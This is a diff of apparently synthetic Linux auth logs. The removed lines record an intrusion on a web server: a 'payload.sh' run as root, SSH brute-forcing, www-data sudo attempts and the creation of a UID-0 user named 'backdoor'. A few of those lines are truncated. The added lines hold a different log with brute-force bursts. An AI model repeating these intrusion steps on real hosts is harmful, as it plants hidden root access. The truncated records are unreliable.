-Nov 01 00:56:47 webserver01 sudo[1443]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x payload.sh
-Nov 01 00:56:51 webserver01 sudo[1444]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=./payload.sh
-Nov 01 00:57:30 webserver01 sshd[1446]: PAM service(sshd) ignoring max retries; 4 > 3
-Nov 01 00:57:44 webserver01 sshd[1447]: PAM service(sshd) ignoring max retries; 6 > 3
-Nov 01 00:58:15 webserver01 sshd[1449]: PAM service(sshd) ignoring max retries; 3 > 3
-Nov 01 00:58:46 webserver01 sshd[1450]: PAM service(sshd) ignoring max retries; 6 > 3
-Nov 01 00:59:00 webserver01 sshd[1452]: PAM service(sshd) ignoring max retries; 5 > 3
-Nov 01 00:59:21 webserver01 sshd[1457]: PAM service(sshd) ignoring max retries; 5 > 3
-Nov 01 00:59:27 webserver01 sshd[1462]: Connection closed by authenticating user root 194.165.16.11 port 51688 [preauth]
-Nov 01 01:00:09 webserver01 sshd[1464]: Connection closed by authenticating user root 185.220.101.34 port 40997 [preauth]
-Nov 01 01:00:20 webserver01 sshd[1469]: Connection closed by authenticating user root 89.248.167.131 port 52225 [preauth]
-Nov 01 01:01:03 webserver01 sshd[1474]: Connection closed by authenticating user root 5.188.86.172 port 50074 [preauth]
-Nov 01 01:01:28 webserver01 sshd[1477]: Connection closed by authenticating user root 198.51.100.7 port 64347 [preauth]
-Nov 01 01:01:56 webserver01 sshd[1482]: Connection closed by authenticating user root 45.95.168.189 port 49228 [preauth]
-Nov 01 01:02:19 webserver01 sshd[1483]: Connection closed by authenticating user root 198.51.100.7 port 60719 [preauth]
-Nov 01 01:02:31 webserver01 sshd[1488]: Connection closed by authenticating user root 194.165.16.11 port 55046 [preauth]
-Nov 01 01:03:05 webserver01 sshd[1492]: error: maximum authentication attempts exceeded for root from 5.188.86.172 port 56258 ssh2 [preauth]
-Nov 01 01:03:08 webserver01 sshd[1495]: error: maximum authentication attempts exceeded for root from 194.165.16.11 port 54523 ssh2 [preauth]
-Nov 01 01:03:30 webserver01 sshd[1497]: error: maximum authentication attempts exceeded for root from 222.186.42.117 port 52565 ssh2 [preauth]
-Nov 01 01:04:05 webserver01 sshd[1499]: error: maximum authentication attempts exceeded for root from 222.186.42.117 port 61998 ssh2 [preauth]
-Nov 01 01:04:33 webserver01 sshd[1500]: error: maximum authentication attempts exceeded for root from 185.220.101.34 port 49352 ssh2 [preauth]
-Nov 01 01:05:00 webserver01 passwd[1502]: pam_unix(passwd:chauthtok): password changed for deploy
-Nov 01 01:05:22 webserver01 passwd[1503]: pam_unix(passwd:chauthtok): password changed for frank
-Nov 01 01:06:02 webserver01 passwd[1508]: pam_unix(passwd:chauthtok): password changed for git
-Nov 01 01:06:29 webserver01 CRON[1510]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:06:29 webserver01 CRON[1510]: pam_unix(cron:session): session closed for user root
-Nov 01 01:07:04 webserver01 CRON[1515]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:07:04 webserver01 CRON[1515]: pam_unix(cron:session): session closed for user root
-Nov 01 01:07:08 webserver01 CRON[1516]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:07:08 webserver01 CRON[1516]: pam_unix(cron:session): session closed for user root
-Nov 01 01:07:33 webserver01 CRON[1517]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:07:33 webserver01 CRON[1517]: pam_unix(cron:session): session closed for user root
-Nov 01 01:08:08 webserver01 CRON[1521]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:08:08 webserver01 CRON[1521]: pam_unix(cron:session): session closed for user root
-Nov 01 01:08:25 webserver01 CRON[1522]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:08:25 webserver01 CRON[1522]: pam_unix(cron:session): session closed for user root
-Nov 01 01:08:33 webserver01 CRON[1524]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:08:33 webserver01 CRON[1524]: pam_unix(cron:session): session closed for user root
-Nov 01 01:09:09 webserver01 CRON[1528]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:09:09 webserver01 CRON[1528]: pam_unix(cron:session): session closed for user root
-Nov 01 01:09:32 webserver01 CRON[1533]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:09:32 webserver01 CRON[1533]: pam_unix(cron:session): session closed for user root
-Nov 01 01:10:16 webserver01 CRON[1537]: pam_unix(cron:session): session opened for user root by (uid=0)
-Nov 01 01:10:16 webserver01 CRON[1537]: pam_unix(cron:session): session closed for user root
-Nov 01 01:10:28 webserver01 systemd-logind[1542]: New session 100 of user bob.
-Nov 01 01:10:28 webserver01 systemd-logind[1542]: Removed session 100.
-Nov 01 01:10:55 webserver01 systemd-logind[1544]: New session 101 of user git.
-Nov 01 01:10:55 webserver01 systemd-logind[1544]: Removed session 101.
-Nov 01 01:10:59 webserver01 systemd-logind[1549]: New session 102 of user git.
-Nov 01 01:10:59 webserver01 systemd-logind[1549]: Removed session 102.
-Nov 01 01:11:22 webserver01 systemd-logind[1550]: New session 103 of user bob.
-Nov 01 01:11:22 webserver01 systemd-logind[1550]: Removed session 103.
-Nov 01 01:11:58 webserver01 systemd-logind[1555]: New session 104 of user git.
-Nov 01 01:11:58 webserver01 systemd-logind[1555]: Removed session 104.
-Nov 01 01:12:07 webserver01 systemd-logind[1558]: New session 105 of user git.
-Nov 01 01:12:07 webserver01 systemd-logind[1558]: Removed session 105.
-Nov 01 01:12:21 webserver01 systemd-logind[1563]: New session 106 of user frank.
-Nov 01 01:12:21 webserver01 systemd-logind[1563]: Removed session 106.
-Nov 01 01:12:43 webserver01 systemd-logind[1565]: New session 107 of user deploy.
-Nov 01 01:12:43 webserver01 systemd-logind[1565]: Removed session 107.
-Nov 01 01:12:59 webserver01 sshd[1566]: Connection closed by 198.51.100.7 port 43201 [preauth]
-Nov 01 01:13:13 webserver01 sshd[1569]: Connection closed by 198.51.100.7 port 14796 [preauth]
-Nov 01 01:13:27 webserver01 sshd[1573]: Connection closed by 198.51.100.7 port 21913 [preauth]
-Nov 01 01:14:08 webserver01 sshd[1577]: Connection closed by 198.51.100.7 port 52074 [preauth]
-Nov 01 01:14:13 webserver01 sshd[1581]: Connection closed by 198.51.100.7 port 56293 [preauth]
-Nov 01 01:14:17 webserver01 sshd[1584]: Connection closed by 198.51.100.7 port 63004 [preauth]
-Nov 01 01:14:48 webserver01 sshd[1586]: Connection closed by 198.51.100.7 port 22154 [preauth]
-Nov 01 01:14:52 webserver01 sshd[1588]: Connection closed by 198.51.100.7 port 37806 [preauth]
-Nov 01 01:15:29 webserver01 sshd[1590]: Connection closed by 198.51.100.7 port 59109 [preauth]
-Nov 01 01:16:14 webserver01 sshd[1591]: Connection closed by 198.51.100.7 port 7557 [preauth]
-Nov 01 01:16:41 webserver01 sshd[1595]: Connection closed by 198.51.100.7 port 20271 [preauth]
-Nov 01 01:17:10 webserver01 sshd[1599]: Connection closed by 198.51.100.7 port 24718 [preauth]
-Nov 01 01:17:17 webserver01 sshd[1600]: Connection closed by 198.51.100.7 port 49947 [preauth]
-Nov 01 01:17:23 webserver01 sshd[1602]: Connection closed by 198.51.100.7 port 5343 [preauth]
-Nov 01 01:17:54 webserver01 sshd[1607]: Connection closed by 198.51.100.7 port 36714 [preauth]
-Nov 01 01:17:59 webserver01 sudo[1612]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
-Nov 01 01:18:09 webserver01 sudo[1616]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
-Nov 01 01:18:31 webserver01 sudo[1618]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
-Nov 01 01:18:40 webserver01 sudo[1622]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
-Nov 01 01:19:21 webserver01 sshd[1626]: Received disconnect from 222.186.42.117 port 61811:11: Bye Bye [preauth]
-Nov 01 01:19:38 webserver01 sshd[1629]: Received disconnect from 185.220.101.34 port 56823:11: Bye Bye [preauth]
-Nov 01 01:20:16 webserver01 sshd[1633]: Received disconnect from 222.186.42.117 port 57012:11: Bye Bye [preauth]
-Nov 01 01:20:51 webserver01 sshd[1635]: Received disconnect from 5.188.86.172 port 61403:11: Bye Bye [preauth]
-Nov 01 01:21:04 webserver01 sshd[1640]: Received disconnect from 45.95.168.189 port 49472:11: Bye Bye [preauth]
-Nov 01 01:21:46 webserver01 sshd[1641]: Received disconnect from 5.188.86.172 port 46024:11: Bye Bye [preauth]
-Nov 01 01:21:54 webserver01 sshd[1646]: Failed password for root from
-Nov 01 01:21:54 webserver01 sshd[1647]:
-Nov  webserver01 sshd[1650]: Accepted password for alice
-Nov 01 01:22:28 webserver01 useradd[1654]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
-Nov 01 01:22:28 webserver01 usermod[1654]: change user 'backdoor' GID from '0' to '0'
+May 24 00:22:03 webserver pam_unix[29041]: Disconnected from authenticating user admin_ops 117.55.34.78 port 61417
+May 24 00:28:21 webserver pam_unix[17488]: pam_unix(sshd:session): session closed for user deploy
+May 24 01:06:57 webserver sshd[46569]: Accepted password for deploy from 14.139.123.45 port 58487 ssh2
+May 24 01:45:02 webserver sshd[51449]: Failed password for ubuntu from 185.220.101.34 port 52981 ssh2
+May 24 01:45:06 webserver sshd[10514]: Failed password for priya from 185.220.101.34 port 51659 ssh2
+May 24 01:45:06 webserver sshd[28101]: Failed password for invalid user oracle from 185.220.101.34 port 52887 ssh2
+May 24 01:45:08 webserver sshd[12566]: Failed password for invalid user backup from 185.220.101.34 port 60440 ssh2
+May 24 01:45:08 webserver sshd[37463]: Failed password for admin from 185.220.101.34 port 60427 ssh2
+May 24 01:45:10 webserver sshd[41941]: Failed password for invalid user support from 185.220.101.34 port 53237 ssh2
+May 24 01:45:11 webserver sshd[63461]: Failed password for guest from 185.220.101.34 port 43761 ssh2
+May 24 01:45:14 webserver sshd[50395]: Failed password for john from 185.220.101.34 port 62753 ssh2
+May 24 01:45:14 webserver sshd[24222]: Failed password for invalid user nagios from 185.220.101.34 port 56423 ssh2
+May 24 01:45:19 webserver sshd[14273]: Failed password for invalid user deploy2 from 185.220.101.34 port 45256 ssh2
+May 24 01:45:19 webserver sshd[60051]: Failed password for oracle from 185.220.101.34 port 53654 ssh2
+May 24 01:45:22 webserver sshd[51180]: Failed password for root from 185.220.101.34 port 57496 ssh2
+May 24 01:45:24 webserver sshd[19109]: Failed password for priya from 185.220.101.34 port 40539 ssh2
+May 24 01:45:24 webserver sshd[36012]: Failed password for oracle from 185.220.101.34 port 56237 ssh2
+May 24 01:45:28 webserver sshd[51589]: Failed password for devops from 185.220.101.34 port 49963 ssh2
+May 24 01:45:28 webserver sshd[54426]: Failed password for ubuntu from 185.220.101.34 port 57040 ssh2
+May 24 01:45:30 webserver sshd[62471]: Failed password for invalid user webmaster from 185.220.101.34 port 57898 ssh2
+May 24 01:45:33 webserver sshd[32639]: Failed password for invalid user ftpuser from 185.220.101.34 port 43274 ssh2
+May 24 01:45:35 webserver sshd[50945]: Failed password for invalid user deploy2 from 185.220.101.34 port 40162 ssh2
+May 24 01:45:41 webserver sshd[29295]: Failed password for invalid user guest from 185.220.101.34 port 53852 ssh2
+May 24 01:45:41 webserver sshd[57270]: Failed password for root from 185.220.101.34 port 40563 ssh2
+May 24 01:45:43 webserver sshd[12555]: Failed password for invalid user support from 185.220.101.34 port 53308 ssh2
+May 24 01:45:44 webserver sshd[61444]: Failed password for postgres from 185.220.101.34 port 53685 ssh2
+May 24 01:45:49 webserver sshd[48626]: Failed password for john from 185.220.101.34 port 48760 ssh2
+May 24 01:45:51 webserver sshd[63591]: Failed password for devops from 185.220.101.34 port 62443 ssh2
+May 24 01:45:51 webserver sshd[16453]: Failed password for devops from 185.220.101.34 port 61960 ssh2
+May 24 01:45:51 webserver sshd[49641]: Failed password for guest from 185.220.101.34 port 45432 ssh2
+May 24 01:45:53 webserver sshd[24665]: Failed password for invalid user user from 185.220.101.34 port 51372 ssh2
+May 24 01:45:53 webserver sshd[19234]: Connection closed by invalid user ubuntu 185.220.101.34 port 44780 [preauth]
+May 24 01:45:55 webserver sshd[58532]: Failed password for admin_ops from 185.220.101.34 port 43954 ssh2
+May 24 04:04:53 webserver sudo[13647]:  ubuntu : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/certbot renew
+May 24 04:57:42 webserver su[56566]: pam_unix(su:auth): authentication failure; logname=admin_ops uid=1000 euid=0 tty=pts/1 ruser=admin_ops rhost=  user=root
+May 24 05:20:13 webserver sshd[34633]: Accepted publickey for ubuntu from 122.161.45.67 port 41031 ssh2: RSA SHA256:b06ed1097e7cbeeb2658f1c8
+May 24 05:52:24 webserver sudo[47943]:  deploy : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/docker ps
+May 24 06:41:11 webserver pam_unix[33946]: Accepted publickey for devops from 115.240.89.12 port 54990 ssh2: RSA SHA256:f92e2bbb8f9666c394b67886
+May 24 08:54:03 webserver sshd[54592]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+May 24 10:19:28 webserver sshd[12055]: Accepted publickey for priya from 103.21.244.10 port 55070 ssh2: RSA SHA256:e302e9a2948326e212dc5c4c
+May 24 11:16:30 webserver pam_unix[63749]: Disconnected from authenticating user devops 122.161.45.67 port 46379
+May 24 12:56:56 webserver su[25039]: Successful su for root by john
+May 24 16:58:04 webserver pam_unix[23612]: Accepted password for priya from 49.36.78.145 port 44062 ssh2
+May 24 17:04:02 webserver sudo[40732]: pam_unix(sudo:auth): authentication failure; logname=devops uid=1000 euid=0 tty=pts/0 ruser=devops rhost=  user=root
+May 24 17:54:33 webserver sudo[53062]:  john : TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+May 24 18:18:02 webserver sshd[57243]: pam_unix(sshd:session): session closed for user devops
+May 24 18:49:20 webserver sshd[16143]: Failed password for john from 14.139.123.45 port 59955 ssh2
+May 24 18:57:37 webserver su[17658]: pam_unix(su:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+May 24 19:13:58 webserver CRON[16116]: pam_unix(cron:session): session closed for user root
+May 24 20:02:29 webserver passwd[25992]: pam_unix(passwd:chauthtok): password changed for priya
+May 24 20:11:56 webserver sshd[34395]: pam_unix(sshd:session): session closed for user ubuntu
+May 24 23:04:50 webserver sshd[50503]: Failed password for ubuntu from 14.139.123.45 port 51212 ssh2
+May 24 23:29:10 webserver sshd[25011]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+May 24 23:55:21 webserver sudo[35939]:  admin_ops : TTY=pts/2 ; PWD=/home/admin_ops ; USER=root ; COMMAND=/bin/cp /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app
+May 25 01:44:45 webserver sshd[52683]: Accepted password for ubuntu from 115.240.89.12 port 47054 ssh2
+May 25 01:45:54 webserver sshd[17857]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=admin_ops
+May 25 01:53:24 webserver sudo[48651]:  devops : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/docker ps
+May 25 02:15:26 webserver pam_unix[16974]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=john
+May 25 03:48:05 webserver pam_unix[62859]: Disconnected from authenticating user john 49.36.78.145 port 53105
+May 25 05:41:06 webserver sshd[38836]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 25 07:08:21 webserver pam_unix[25722]: Accepted password for admin_ops from 49.36.78.145 port 40268 ssh2
+May 25 08:56:11 webserver su[42436]: pam_unix(su:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+May 25 08:57:18 webserver sudo[31343]:  priya : TTY=pts/2 ; PWD=/home/priya ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+May 25 09:01:53 webserver pam_unix[61933]: Accepted publickey for john from 103.21.244.10 port 45658 ssh2: RSA SHA256:8363df81aff86aff1005f0d5
+May 25 09:37:24 webserver sshd[13665]: Accepted password for admin_ops from 115.240.89.12 port 49838 ssh2
+May 25 10:28:55 webserver sshd[46500]: Accepted publickey for ubuntu from 49.36.78.145 port 40876 ssh2: RSA SHA256:247f01c685ed5ef75b35b999
+May 25 11:10:27 webserver pam_unix[38553]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=admin_ops
+May 25 11:18:35 webserver sshd[22745]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=admin_ops
+May 25 11:48:22 webserver sshd[18896]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 25 12:37:46 webserver CRON[20599]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+May 25 12:42:20 webserver passwd[16185]: pam_unix(passwd:chauthtok): password changed for devops
+May 25 12:47:21 webserver pam_unix[37500]: pam_unix(sshd:session): session closed for user deploy
+May 25 14:23:18 webserver sudo[41872]:  ubuntu : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+May 25 15:33:03 webserver sshd[24594]: pam_unix(sshd:session): session closed for user devops
+May 25 15:53:33 webserver su[56229]: pam_unix(su:auth): authentication failure; logname=devops uid=1000 euid=0 tty=pts/1 ruser=devops rhost=  user=root
+May 25 16:35:55 webserver sshd[28778]: Disconnected from authenticating user ubuntu 117.55.34.78 port 42887
+May 25 17:45:56 webserver sshd[35433]: pam_unix(sshd:session): session closed for user priya
+May 25 21:31:54 webserver sshd[25060]: Failed password for priya from 117.55.34.78 port 54729 ssh2
+May 25 22:22:11 webserver sudo[55297]:  deploy : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/certbot renew
+May 25 22:23:34 webserver pam_unix[63510]: pam_unix(sshd:session): session closed for user admin_ops
+May 25 22:57:20 webserver pam_unix[16425]: pam_unix(sshd:session): session closed for user priya
+May 25 23:14:34 webserver sshd[53181]: Accepted password for priya from 115.240.89.12 port 50000 ssh2
+May 25 23:55:25 webserver sudo[64551]:  devops : TTY=pts/2 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+May 26 00:19:41 webserver sudo[42152]:  john : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/apt update
+May 26 01:38:42 webserver pam_unix[34895]: Accepted publickey for devops from 117.55.34.78 port 52950 ssh2: RSA SHA256:f7463853ed2c511da45ae1f6
+May 26 03:37:01 webserver sshd[61050]: Failed password for ubuntu from 115.240.89.12 port 61373 ssh2
+May 26 03:48:50 webserver sudo[15807]: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost=  user=root
+May 26 04:30:21 webserver sshd[35436]: pam_unix(sshd:session): session closed for user priya
+May 26 08:37:53 webserver su[16222]: pam_unix(su:auth): authentication failure; logname=deploy uid=1000 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+May 26 09:47:47 webserver sshd[48501]: pam_unix(sshd:session): session closed for user devops
+May 26 10:11:44 webserver sshd[17579]: pam_unix(sshd:session): session closed for user admin_ops
+May 26 12:12:25 webserver sshd[46251]: Accepted publickey for devops from 49.36.78.145 port 47040 ssh2: RSA SHA256:db3981b7c3e064ad17322da0
+May 26 12:22:28 webserver sshd[55877]: pam_unix(sshd:session): session closed for user admin_ops
+May 26 12:51:19 webserver sshd[12585]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=john
+May 26 13:10:56 webserver sudo[28899]:  admin_ops : TTY=pts/2 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/kill -9 1234
+May 26 18:02:15 webserver sudo[15788]:  deploy : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+May 26 18:31:55 webserver sshd[61845]: Accepted password for priya from 103.21.244.10 port 60239 ssh2
+May 26 20:10:51 webserver sshd[61138]: Disconnected from authenticating user ubuntu 117.55.34.78 port 57101
+May 26 21:47:23 webserver sshd[56465]: Accepted password for ubuntu from 122.161.45.67 port 49510 ssh2
+May 26 21:57:01 webserver pam_unix[63288]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+May 26 22:07:53 webserver pam_unix[25573]: pam_unix(sshd:session): session closed for user ubuntu
+May 27 00:03:51 webserver CRON[33957]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 27 00:22:39 webserver sshd[19690]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=devops
+May 27 06:02:56 webserver sshd[12001]: Failed password for invalid user guest from 45.95.168.190 port 64533 ssh2
+May 27 06:02:57 webserver sshd[12001]: Connection closed by invalid user guest 45.95.168.190 port 64533 [preauth]
+May 27 06:03:37 webserver sshd[21148]: Invalid user support from 45.95.168.190 port 64681
+May 27 06:03:38 webserver sshd[21148]: Connection closed by invalid user support 45.95.168.190 port 64681 [preauth]
+May 27 06:03:52 webserver sshd[50707]: Invalid user nagios from 45.95.168.190 port 60859
+May 27 06:03:53 webserver sshd[50707]: Connection closed by invalid user nagios 45.95.168.190 port 60859 [preauth]
+May 27 06:04:45 webserver sshd[64027]: Invalid user ubuntu2 from 45.95.168.190 port 54694
+May 27 06:04:47 webserver sshd[64027]: Connection closed by invalid user ubuntu2 45.95.168.190 port 54694 [preauth]
+May 27 06:06:21 webserver sshd[20655]: Invalid user deploy2 from 45.95.168.190 port 54838
+May 27 06:06:22 webserver sshd[20655]: Connection closed by invalid user deploy2 45.95.168.190 port 54838 [preauth]
+May 27 06:06:44 webserver sshd[36642]: Failed password for invalid user backup from 45.95.168.190 port 57864 ssh2
+May 27 06:06:47 webserver sshd[36642]: Connection closed by invalid user backup 45.95.168.190 port 57864 [preauth]
+May 27 06:10:26 webserver sshd[19441]: Failed password for invalid user user from 45.95.168.190 port 62218 ssh2
+May 27 06:10:29 webserver sshd[19441]: Connection closed by invalid user user 45.95.168.190 port 62218 [preauth]
+May 27 06:13:22 webserver sshd[35704]: Invalid user postgres from 45.95.168.190 port 58178
+May 27 06:13:24 webserver sshd[35704]: Connection closed by invalid user postgres 45.95.168.190 port 58178 [preauth]
+May 27 06:13:47 webserver sshd[23700]: Invalid user admin from 45.95.168.190 port 48340
+May 27 06:13:48 webserver sshd[23700]: Connection closed by invalid user admin 45.95.168.190 port 48340 [preauth]
+May 27 06:14:03 webserver sshd[27762]: Invalid user git from 45.95.168.190 port 50678
+May 27 06:14:06 webserver sshd[27762]: Connection closed by invalid user git 45.95.168.190 port 50678 [preauth]
+May 27 06:18:48 webserver sshd[21454]: Invalid user www-data from 45.95.168.190 port 63073
+May 27 06:18:51 webserver sshd[21454]: Connection closed by invalid user www-data 45.95.168.190 port 63073 [preauth]
+May 27 06:19:01 webserver sshd[36553]: Invalid user oracle from 45.95.168.190 port 40022
+May 27 06:19:03 webserver sshd[36553]: Connection closed by invalid user oracle 45.95.168.190 port 40022 [preauth]
+May 27 06:19:23 webserver sshd[60026]: Failed password for invalid user test from 45.95.168.190 port 54914 ssh2
+May 27 06:19:26 webserver sshd[60026]: Connection closed by invalid user test 45.95.168.190 port 54914 [preauth]
+May 27 06:19:41 webserver sshd[11824]: Failed password for invalid user pi from 45.95.168.190 port 54730 ssh2
+May 27 06:19:44 webserver sshd[11824]: Connection closed by invalid user pi 45.95.168.190 port 54730 [preauth]
+May 27 06:22:01 webserver sshd[60031]: Invalid user jenkins from 45.95.168.190 port 56978
+May 27 06:22:02 webserver sshd[60031]: Connection closed by invalid user jenkins 45.95.168.190 port 56978 [preauth]
+May 27 06:26:41 webserver sshd[59275]: Invalid user ftpuser from 45.95.168.190 port 41939
+May 27 06:26:42 webserver sshd[59275]: Connection closed by invalid user ftpuser 45.95.168.190 port 41939 [preauth]
+May 27 06:29:06 webserver sshd[32312]: Invalid user webmaster from 45.95.168.190 port 48011
+May 27 06:29:08 webserver sshd[32312]: Connection closed by invalid user webmaster 45.95.168.190 port 48011 [preauth]
+May 27 06:29:11 webserver sshd[64000]: Invalid user mysql from 45.95.168.190 port 40055
+May 27 06:29:13 webserver sshd[64000]: Connection closed by invalid user mysql 45.95.168.190 port 40055 [preauth]
+May 27 06:29:28 webserver sshd[15617]: Invalid user root from 45.95.168.190 port 51450
+May 27 06:29:30 webserver sshd[15617]: Connection closed by invalid user root 45.95.168.190 port 51450 [preauth]
+May 27 06:52:24 webserver sshd[51678]: Failed password for priya from 122.161.45.67 port 45411 ssh2
+May 27 08:34:23 webserver sshd[30110]: Accepted password for admin_ops from 117.55.34.78 port 48029 ssh2
+May 27 08:51:47 webserver sshd[36921]: Accepted publickey for deploy from 117.55.34.78 port 47368 ssh2: RSA SHA256:88f5da3491c9fb2de2b3ed1b
+May 27 09:06:20 webserver sshd[24305]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=priya
+May 27 09:42:51 webserver sudo[54871]:  admin_ops : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+May 27 11:01:15 webserver passwd[26343]: pam_unix(passwd:chauthtok): password changed for priya
+May 27 14:51:57 webserver pam_unix[50574]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 27 20:17:13 webserver su[62300]: Successful su for root by priya
+May 27 21:53:28 webserver sshd[23048]: Accepted publickey for deploy from 115.240.89.12 port 51455 ssh2: RSA SHA256:001dd853b58cffe23dd74d9a
+May 27 22:14:28 webserver sshd[27647]: Accepted publickey for john from 117.55.34.78 port 40066 ssh2: RSA SHA256:a0f9bd8187aa6a9cc8256663
+May 27 22:28:24 webserver sshd[43478]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 27 23:17:18 webserver sshd[22672]: Failed password for john from 117.55.34.78 port 61549 ssh2
+May 27 23:53:00 webserver sudo[19781]:  priya : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/bin/chmod 600 /etc/ssl/private/server.key
+May 28 00:00:26 webserver sshd[33414]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 28 00:48:02 webserver pam_unix[17109]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=john
+May 28 01:55:19 webserver sshd[45128]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=ubuntu
+May 28 03:55:34 webserver sshd[29878]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+May 28 04:43:42 webserver su[62171]: pam_unix(su:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/1 ruser=ubuntu rhost=  user=root
+May 28 05:22:15 webserver sshd[52329]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=admin_ops
+May 28 06:14:42 webserver CRON[31332]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+May 28 06:24:50 webserver sshd[21561]: Accepted password for ubuntu from 122.161.45.67 port 48039 ssh2
+May 28 08:30:10 webserver useradd[18005]: new user: name=svc_cache, UID=1355, GID=1483, home=/home/svc_cache, shell=/bin/bash
+May 28 10:03:21 webserver pam_unix[58892]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=deploy
+May 28 10:20:53 webserver sudo[34071]:  ubuntu : TTY=pts/2 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+May 28 11:13:13 webserver pam_unix[13603]: Accepted password for john from 117.55.34.78 port 51863 ssh2
+May 28 12:26:34 webserver sshd[59951]: Accepted password for priya from 14.139.123.45 port 44728 ssh2
+May 28 12:42:23 webserver pam_unix[21726]: Accepted publickey for deploy from 14.139.123.45 port 57469 ssh2: RSA SHA256:b79cffa12c3c5bd9d13f00bd
+May 28 13:32:43 webserver sshd[54680]: Accepted password for john from 117.55.34.78 port 59256 ssh2
+May 28 13:46:27 webserver pam_unix[31141]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 28 13:51:58 webserver sshd[38524]: Accepted publickey for john from 103.21.244.10 port 64995 ssh2: RSA SHA256:b83327d60838606e5fd83151
+May 28 15:39:25 webserver sshd[12409]: Accepted publickey for priya from 115.240.89.12 port 55352 ssh2: RSA SHA256:e673f4ec8593095ec7b22976
+May 28 16:22:41 webserver sshd[32064]: pam_unix(sshd:session): session closed for user devops
+May 28 17:17:10 webserver sudo[17127]:  devops : TTY=pts/1 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/kill -9 1234
+May 28 18:47:17 webserver sshd[39284]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=priya
+May 28 19:12:16 webserver sshd[14109]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 28 19:52:00 webserver sshd[37184]: Accepted publickey for deploy from 122.161.45.67 port 48929 ssh2: RSA SHA256:a3d85dae393f80b8376e3dc8
